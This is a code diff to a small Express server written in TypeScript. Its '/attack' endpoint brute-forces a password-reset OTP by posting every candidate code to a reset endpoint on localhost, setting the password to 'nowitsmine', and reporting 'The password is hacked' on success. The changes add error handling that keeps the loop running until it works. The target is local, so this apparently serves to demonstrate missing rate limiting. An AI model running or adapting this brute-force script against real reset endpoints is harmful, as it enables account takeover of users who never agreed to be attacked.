@@ -22,23 +22,36 @@ app.get('/', async(req,res)=>{
 
 app.post('/attack', async(req, res)=>{
     const email = req.body.email;
+    let response1 = 0;
     
     for (let i = 0; i < possibleOtps.length; i++){
         let otp:string = possibleOtps[i].toString();
-        const response = await axios.post('http://localhost:3000/reset-password', {
+        try {
+            const response = await axios.post('http://localhost:3000/reset-password', {
           
-            "email":email,
-            "newpassword":"nowitsmine",
-            "otp":otp
+            email:email,
+            newpassword:"nowitsmine",
+            otp:otp
         
-        })
-        if(response.status == 200){
-            break;
+            })
+            if(response.status === 200){
+                response1 = response.status
+                break;
+            }   
+        } catch (error) {
+            console.log(`${i} failed`);
+            
         }
     }
-    return res.json({
-        msg:`the password is hacked.`
-    })
+    if(response1 == 200){
+        return res.json({
+            msg:'The password is hacked'
+        })
+    }else{
+        return res.json({
+            msg:'Unable to hack password'
+        })
+    }
 })
 
 app.listen(3001);
